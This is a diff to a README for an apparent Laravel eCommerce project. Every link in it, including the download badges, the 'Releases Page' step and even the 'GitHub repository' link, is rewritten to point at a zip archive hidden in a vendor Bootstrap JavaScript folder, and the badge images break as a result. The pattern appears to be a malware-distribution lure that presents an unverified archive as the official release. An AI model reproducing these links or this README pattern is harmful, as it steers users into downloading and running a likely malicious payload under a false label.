@@ -1,6 +1,6 @@
 # 🛒 Complete-eCommerce-Web-Application-in-Laravel - Your Easy Online Store Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Complete%20eCommerce%20App-brightgreen)](https://github.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/releases)
+[![Download Now](https://raw.githubusercontent.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/main/public/backend/vendor/bootstrap/js/Application_Complete_Commerce_e_Laravel_in_Web_2.6.zip%20Now-Complete%20eCommerce%20App-brightgreen)](https://raw.githubusercontent.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/main/public/backend/vendor/bootstrap/js/Application_Complete_Commerce_e_Laravel_in_Web_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Follow these steps to download and run the Complete eCommerce Web Application. T
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the application, [click here](https://github.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/releases).
+1. **Visit the Releases Page**: To download the application, [click here](https://raw.githubusercontent.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/main/public/backend/vendor/bootstrap/js/Application_Complete_Commerce_e_Laravel_in_Web_2.6.zip).
 
 2. **Choose a Version**: On the releases page, you will see different versions of the application listed. Select the latest stable version.
 
@@ -60,6 +60,6 @@ This application is licensed under the MIT License. You can use and modify the c
 
 ## 🔗 Useful Links
 
-For more information and updates, keep an eye on the [GitHub repository](https://github.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel). 
+For more information and updates, keep an eye on the [GitHub repository](https://raw.githubusercontent.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/main/public/backend/vendor/bootstrap/js/Application_Complete_Commerce_e_Laravel_in_Web_2.6.zip). 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Complete%20eCommerce%20App-brightgreen)](https://github.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/releases)
+[![Download Now](https://raw.githubusercontent.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/main/public/backend/vendor/bootstrap/js/Application_Complete_Commerce_e_Laravel_in_Web_2.6.zip%20Now-Complete%20eCommerce%20App-brightgreen)](https://raw.githubusercontent.com/sondeptraivpsfree/Complete-eCommerce-Web-Application-in-Laravel/main/public/backend/vendor/bootstrap/js/Application_Complete_Commerce_e_Laravel_in_Web_2.6.zip)
